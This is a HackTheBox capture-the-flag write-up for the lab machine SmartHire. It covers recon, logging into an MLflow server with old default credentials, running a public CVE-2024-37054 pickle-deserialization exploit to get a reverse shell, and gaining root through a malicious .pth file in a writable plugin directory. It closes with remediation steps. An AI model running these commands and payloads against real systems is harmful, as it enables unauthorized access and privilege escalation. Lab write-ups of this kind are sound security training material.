---
title: "SmartHire"
date: 2026-09-26 00:00:00 +0500
categories: [HackTheBox, Linux]
tags: [CVE-2026-2635, Auth-Bypass, Deserialization, CVE-2024-37054, python-site-module-hijacking]
description: Writeup for HackTheBox SmartHire machine
image:
  path: assets/img/smarthire/smarthire.png
  alt: HTB SmartHire
---

## Executive Summary

This writeup documents the complete attack chain against the HackTheBox machine **SmartHire**, a Linux system running a machine learning-based hiring platform vulnerable to deserialization and privilege escalation attacks.

**Attack Chain Summary:**

1. **Authentication Bypass (CVE-2026-2635) → MLflow Access:** Virtual host enumeration discovered a hidden MLflow tracking server (`models.smarthire.htb`) behind HTTP Basic Auth. A review of the MLflow open-source repository's commit history revealed old default credentials (`admin:password`), which granted administrative access to the tracking server.
2. **MLflow Pickle Deserialization (CVE-2024-37054) → Initial Access:** The MLflow instance was running a version vulnerable to CVE-2024-37054, an unsafe deserialization flaw when loading `cloudpickle` models. A malicious model containing a reverse shell payload was crafted and registered. Deserialization was triggered via the prediction endpoint, yielding a shell as `svcweb`.
3. **Python `site` Module Hijacking → Root:** The `svcweb` user could run a custom MLflow control script (`mlflowctl.py`) via `sudo` without a password. This script used `site.addsitedir()` to load plugins from a directory writable by the `devs` group, of which `svcweb` was a member. A malicious `.pth` file dropped into that directory was automatically executed during interpreter initialization, granting root.

---

## Recon

Started with a full nmap scan.

```
┌──(kali㉿kali)-[~/HTB/Linux/SmartHire]
└─$ sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 8000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN nmap.scan
Nmap scan report for 10.129.6.170
Host is up (0.40s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 41:3c:e3:bb:88:70:99:7f:b8:96:59:48:9b:85:98:69 (ECDSA)
|_  256 d5:9d:fd:6b:be:d8:39:6f:3f:43:ab:0e:f6:3e:22:db (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://smarthire.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports open. SSH on 22, which from the version looks like Ubuntu 22.04 LTS. Port 80 is nginx redirecting to `smarthire.htb`, so I added that to `/etc/hosts`.

```bash
echo "10.129.6.170  smarthire.htb" | sudo tee -a /etc/hosts
```

---

## Web App

The site is an AI hiring evaluation platform. You can register an account, train ML models by uploading CSV datasets, and then run predictions against those models.

<img src="assets/img/smarthire/web_home.png" alt="error loading image">

I registered a test account (`cognito:Password123`) and logged in.

<img src="assets/img/smarthire/register.png" alt="error loading image">

The dashboard gives you two options: train a model and assess CVs.

<img src="assets/img/smarthire/dashboard.png" alt="error loading image">

To train a model, you upload a CSV with hiring data:

```bash
cat > data.csv << 'EOF'
name,skills,experience,education,position_applied,previous_company
John Smith,"Python, Machine Learning, SQL",60,Master's in CS,Data Scientist,TechCorp
Sarah Johnson,"JavaScript, React, Node.js",36,Bachelor's in SE,Full Stack Dev,StartupXYZ
Mike Brown,"Java, Spring Boot, PostgreSQL",84,Bachelor's in IT,Backend Developer,Enterprise Inc
EOF
```

```bash
curl -s -X POST http://smarthire.htb/upload_hiring_data \
  -H "Cookie: session=<SESSION_COOKIE>" \
  -F "file=@data.csv;type=text/csv;filename=data.csv" | jq
```

```json
{
  "message": "Model trained and registered successfully",
  "model_deleted": false,
  "model_info": {
    "creation_timestamp": 1780048957474,
    "description": "No description",
    "version": "3"
  },
  "registered_model": "cognito's developers-b10055438447-model",
  "status": "success"
}
```

And for predictions:

```bash
cat > test.csv << 'EOF'
experience,skills
36,"Python, Machine Learning, SQL"
60,"JavaScript, React, Node.js"
EOF
```

```bash
curl -s -X POST http://smarthire.htb/predict \
  -H "Cookie: session=<SESSION_COOKIE>" \
  -F "file=@test.csv;type=text/csv;filename=test.csv" | jq
```

```json
{
  "model_info": {
    "creation_timestamp": 1780048957474,
    "description": "No description",
    "version": "3"
  },
  "prediction": [100],
  "status": "success"
}
```

I poked around for CSV injection and file upload bypasses but nothing worked there. The app validates input pretty well on that front. What did work was vhost fuzzing — I found `models.smarthire.htb` which came back with a 401.

---

## MLflow Tracking Server

```bash
┌──(kali㉿kali)-[~/HTB/Linux/SmartHire]
└─$ gobuster vhost -u http://smarthire.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50 --ad
```

Added the new vhost to `/etc/hosts`:

```bash
echo "10.129.6.170  models.smarthire.htb" | sudo tee -a /etc/hosts
```

Hitting it with curl confirmed it's an MLflow tracking server behind HTTP Basic Auth:

```bash
┌──(kali㉿kali)-[~/HTB/Linux/SmartHire]
└─$ curl -v http://models.smarthire.htb
* Host models.smarthire.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.9.188
*   Trying 10.129.9.188:80...
* Established connection to models.smarthire.htb (10.129.9.188 port 80) from 10.10.15.213 port 46070 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: models.smarthire.htb
> User-Agent: curl/8.19.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 401 UNAUTHORIZED
< Server: nginx/1.18.0 (Ubuntu)
< Date: Fri, 29 May 2026 10:33:09 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 137
< Connection: keep-alive
< WWW-Authenticate: Basic realm="mlflow"
< 
* Connection #0 to host models.smarthire.htb:80 left intact
You are not authenticated. Please see https://www.mlflow.org/docs/latest/auth/index.html#authenticating-to-mlflow on how to authenticate.
```

The `WWW-Authenticate: Basic realm="mlflow"` header gives it away. MLflow ships with a `basic_auth.ini` config that has default creds. The current version on [GitHub](https://github.com/mlflow/mlflow/blob/master/mlflow/server/auth/basic_auth.ini) shows `admin:password1234`, but that didn't work. I dug through the commit history and found they changed it at some point — the old default was `admin:password`, and that got me in.

<img src="assets/img/smarthire/mlflow_creds_old.png" alt="error loading image">

```bash
curl -u admin:password http://models.smarthire.htb/
```

Full access to the MLflow UI and API.

---

## RCE via Pickle Deserialization (CVE-2024-37054)

The MLflow version running here is vulnerable to [CVE-2024-37054](https://www.hiddenlayer.com/sai-security-advisory/2024-06-mlflow-2). The core issue is that MLflow's sklearn model loader calls `pickle.load()` / `cloudpickle.load()` on model artifacts without any validation:

```python
def _load_model_from_local_file(path, serialization_format):
    with open(path, "rb") as f:
        if serialization_format == SERIALIZATION_FORMAT_PICKLE:
            return pickle.load(f)  # VULNERABLE
        elif serialization_format == SERIALIZATION_FORMAT_CLOUDPICKLE:
            import cloudpickle
            return cloudpickle.load(f)  # VULNERABLE
```

Python's pickle deserializer will happily instantiate arbitrary objects and call arbitrary methods, so if you can get a malicious pickle file loaded as a model artifact, you get code execution when someone (or the app itself) calls `load_model()`.

I used [tristanqtn's public exploit](https://github.com/tristanqtn/CVE-2024-37054) which automates the whole chain: it authenticates to the app, uploads training data to register a model, grabs the run ID from MLflow's API, replaces the model artifact with a malicious cloudpickle containing a reverse shell, and then hits the `/predict` endpoint to trigger deserialization.

```bash
python3 poc.py http://smarthire.htb http://models.smarthire.htb 10.10.15.213 4444 --mlflow-creds admin:password --app-username cognito --app-password Password123
```

```shell
┌──(kali㉿kali)-[~/HTB/Linux/SmartHire/CVE-2024-37054]
└─$ python3 poc.py http://smarthire.htb http://models.smarthire.htb 10.10.15.213 4444 --mlflow-creds admin:password --app-username cognito --app-password Password123

    ╔═══════════════════════════════════════════════════════════════╗                                                                            
    ║                                                               ║                                                                            
    ║   CVE-2024-37054 - MLflow Pickle Deserialization RCE          ║                                                                            
    ║   MLflow Tracking Server Remote Code Execution                ║                                                                            
    ║                                                               ║                                                                            
    ║   Author:  Security Researcher                                ║                                                                            
    ║   Version: 1.0.0                                              ║                                                                            
    ║   CVE:     CVE-2024-37054                                     ║                                                                            
    ║   CVSS:    8.8 (HIGH)                                         ║                                                                            
    ║                                                               ║                                                                            
    ╚═══════════════════════════════════════════════════════════════╝                                                                            
    
[*] Target: http://smarthire.htb
[*] MLflow: http://models.smarthire.htb
[*] Listener: 10.10.15.213:4444
[*] Payload: Python reverse shell

[*] Step 1/6: Authentication
[*] Authenticating as cognito...
[+] Authentication successful
[*] Step 2/6: Generating payload
[+] Payload size: 255 bytes
[*] Step 3/6: Registering model
[*] Uploading training data to register model...
[+] Model registered: cognito's manufacturer-b290f8fe6a32-model (v2)
[*] Step 4/6: Retrieving run ID
[*] Waiting 2s for MLflow to register...
[*] Searching for MLflow runs...
[+] Found run: 96d2788f01254179bfc0c78ac306d844
[*] Step 5/6: Uploading malicious pickle
[*] Uploading malicious pickle to run 96d2788f01254179bfc0c78ac306d844...
[+] Payload uploaded successfully (255 bytes)
[*] Step 6/6: Triggering remote code execution

[*] Starting reverse shell handler...
[*] Triggering deserialization via prediction...
[!] LISTENER: nc -lvnp 4444
[+] Request timed out - shell should be connected!

[+] Exploit completed!
[*] If shell didn't connect, try: nc -lvnp 4444
```

Had my listener ready with penelope:

```bash
penelope -p 4444
```

And got a shell back as `svcweb`:

```shell
(Penelope)─(Session [1])> exec id
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

Grabbed the user flag:

```bash
(Penelope)─(Session [1])> exec cat ~/user.txt
**************f97d8dc8897f4d5de
```

---

## Privilege Escalation

Checked what sudo lets me do:

```bash
sudo -l
```

```
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

So I can run this `mlflowctl.py` script as root with any arguments. Let's look at it:

```python
#!/usr/bin/env python3
"""
MLFLOW-CTL: Operational interface for managing the MLflow service.
Supports a pluggable extension model for environment-specific logic.
For changes or plugin requests, please contact the Platform Team.
"""

from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def print_usage():
    print("Usage: mlflowctl.py [status|backup-models|restart]")
    sys.exit(1)

def main():
    import mlflow_actions, backup_models

    if len(sys.argv) < 2:
        print_usage()

    action = sys.argv[1]

    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        print("[*] Running backup via backup_models plugin...")
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()
    else:
        print(f"[!] Unknown action: {action}")
        print_usage()

if __name__ == "__main__": main()
```

The interesting part is the loop at the top. It iterates over every subdirectory under `/opt/tools/mlflow_ctl/plugins/` and calls `site.addsitedir()` on each one. The `site` module in Python does something sneaky when you add a site directory — it looks for `.pth` files in that directory and executes any line that starts with `import`. This is meant for package setup, but it's trivially abusable.

There are two subdirectories under plugins:

```bash
(Penelope)─(Session [1])> exec ls /opt/tools/mlflow_ctl/plugins/core
backup_models.py
mlflow_actions.py
__pycache__
```

```bash
(Penelope)─(Session [1])> exec ls -la /opt/tools/mlflow_ctl/plugins
total 16
drwxr-xr-x 4 root root 4096 Feb 19 18:10 .
drwxr-xr-x 3 root root 4096 Feb 19 18:16 ..
drwxr-xr-x 3 root root 4096 Feb 20 09:26 core
drwxrwxr-x 2 root devs 4096 May 12 15:22 dev
```

The `dev` directory is owned by `root:devs` with 775 permissions, and `svcweb` is a member of the `devs` group. So I can write to it.

The exploit is straightforward — drop a `.pth` file in the `dev` directory with an `import` line that runs a command. It has to be a single line because Python's site module reads `.pth` files line by line and only executes lines that start with `import`. Everything else gets treated as a path to add. So you chain your actual command after the import using a semicolon:

```bash
(Penelope)─(Session [1])> exec echo "import os; os.system('cp /root/root.txt /tmp/root.txt && chmod +r /tmp/root.txt')" >> /opt/tools/mlflow_ctl/plugins/dev/exploit.pth
```

Then trigger it by running the sudo command:

```bash
(Penelope)─(Session [1])> exec sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
[*] Checking MLflow service status...

[+] MLflow service status: active
[+] MLflow container status: 'Up 2 hours'
```

What happens behind the scenes: sudo runs the script as root, the script iterates the plugin directories, `site.addsitedir()` picks up `exploit.pth` from the `dev` directory, and Python executes the import line before anything else runs. Since it's running as root, the `os.system()` call copies the root flag to `/tmp` with readable permissions.

```bash
(Penelope)─(Session [1])> exec cat /tmp/root.txt
************85ceae1be1ae25fc
```

And that's root.

---

## Remediation

1) Upgrade MLflow to 2.14.2 or later — that patches the pickle deserialization RCE (CVE-2024-37054).

2) Change the default MLflow credentials. The `basic_auth.ini` still had the old `admin:password` from the public git history. Replace it with something strong and unique.

```bash
chmod g-w /opt/tools/mlflow_ctl/plugins/dev
```

3) Strip group write from the `dev` plugin directory. There's no reason `svcweb` or anyone in the `devs` group should be able to drop files into a path that gets loaded by a root-level sudo script.

4) Stop using `site.addsitedir()` for plugin loading. It processes `.pth` files automatically, which turns any writable directory into a code execution vector. Use `sys.path.append()` instead, and only point it at root-owned, read-only directories.
